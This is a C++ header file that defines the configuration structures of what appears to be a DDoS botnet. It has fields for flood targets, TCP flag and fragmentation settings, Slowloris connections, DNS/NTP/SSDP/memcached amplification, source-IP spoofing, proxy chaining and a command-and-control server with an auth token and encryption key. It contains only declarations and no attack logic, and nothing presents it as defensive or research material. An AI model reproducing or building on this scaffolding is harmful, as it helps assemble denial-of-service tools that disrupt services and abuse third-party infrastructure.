#ifndef COMMON_H
#define COMMON_H

#include <string>
#include <vector>
#include <atomic>
#include <chrono>

// Target configuration
struct TargetConfig {
    std::string ip;
    int port;
    std::string protocol; // "tcp", "udp", "icmp", "http", etc.
    std::string url;      // For application layer attacks
};

// Attack parameters for volume attacks
struct AttackParams {
    int packet_count;
    int packet_size;
    int duration; // in seconds
    int threads;
};

// Protocol-specific parameters
struct ProtocolParams {
    int flags; // For TCP: SYN, ACK, RST, etc.
    bool use_fragmentation;
    int ttl;
};

// Application layer parameters
struct AppParams {
    int connections; // for Slowloris
    std::string user_agent;
    bool keep_alive;
};

// Amplification configuration
struct AmplificationConfig {
    std::vector<std::string> amplifiers;
    std::string service; // "dns", "ntp", "ssdp", "memcached"
    int multiplier;      // Expected amplification factor
};

// Obfuscation settings
struct ObfuscationSettings {
    bool spoof_source_ip;
    bool use_proxy;
    std::string proxy_chain; // Comma-separated proxy list
    std::string encryption_key;
};

// C2 configuration
struct C2Config {
    std::string server_ip;
    int server_port;
    std::string auth_token;
    std::string encryption_key;
};

// Command structure
struct Command {
    int attack_type; // 1=volume, 2=protocol, 3=app, 4=amp
    TargetConfig target;
    AttackParams params;
    ProtocolParams protocol_params;
    AppParams app_params;
    AmplificationConfig amp_config;
    ObfuscationSettings obf_settings;
};

// Event logging
struct Event {
    std::string message;
    long timestamp;
    std::string hash; // SHA-256 hash of the message
};

#endif // COMMON_H
